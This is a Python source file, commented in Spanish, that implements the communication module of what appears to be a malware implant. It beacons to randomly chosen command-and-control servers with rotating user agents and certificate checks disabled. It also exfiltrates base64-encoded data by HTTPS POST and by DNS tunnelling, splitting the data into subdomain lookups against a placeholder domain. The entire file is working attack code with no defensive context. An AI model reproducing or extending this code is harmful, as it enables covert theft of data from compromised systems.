import requests
import socket
import random
import base64
import time
from datetime import datetime


# Simulación de log_action (en caso de que no exista en utilities.py)
def log_action(message, details=None, level="INFO"):
    log = f"[{level}] {message}"
    if details:
        log += f" | {details}"
    print(log)


class CommunicationManager:
    def __init__(self, c2_servers, user_agents):
        self.c2_servers = c2_servers
        self.user_agents = user_agents

    def send_beacon(self, data):
        """Enviar beacon a servidor C2"""
        server = random.choice(self.c2_servers)
        headers = {
            'User-Agent': random.choice(self.user_agents),
            'Content-Type': 'application/json'
        }

        try:
            response = requests.post(
                server,
                headers=headers,
                json=data,
                timeout=30,
                verify=False
            )

            if response.status_code == 200:
                log_action(f"Beacon sent to {server}", level="DEBUG")
                return response.json()
        except Exception as e:
            log_action(f"Beacon failed to {server}", details=str(e), level="WARN")

        return None

    def exfiltrate_data(self, data, method="https"):
        """Exfiltrar datos por diferentes métodos"""
        methods = {
            "https": self._exfil_https,
            "dns": self._exfil_dns
        }

        if method in methods:
            return methods[method](data)
        return False

    def _exfil_https(self, data):
        try:
            server = random.choice(self.c2_servers)
            encoded_data = base64.b64encode(data.encode()).decode()

            payload = {
                'data': encoded_data,
                'timestamp': datetime.now().isoformat()
            }

            response = requests.post(
                server,
                headers={'User-Agent': random.choice(self.user_agents)},
                json=payload,
                timeout=30,
                verify=False
            )

            return response.status_code == 200
        except Exception as e:
            log_action("HTTPS exfiltration failed", details=str(e), level="ERROR")
            return False

    def _exfil_dns(self, data):
        try:
            encoded = base64.b64encode(data.encode()).decode().replace('=', '')
            chunks = [encoded[i:i + 30] for i in range(0, len(encoded), 30)]

            for chunk in chunks:
                domain = f"{chunk}.example.com"  # dominio ficticio
                socket.gethostbyname(domain)
                time.sleep(0.5)

            return True
        except Exception as e:
            log_action("DNS exfiltration failed", details=str(e), level="ERROR")
            return False
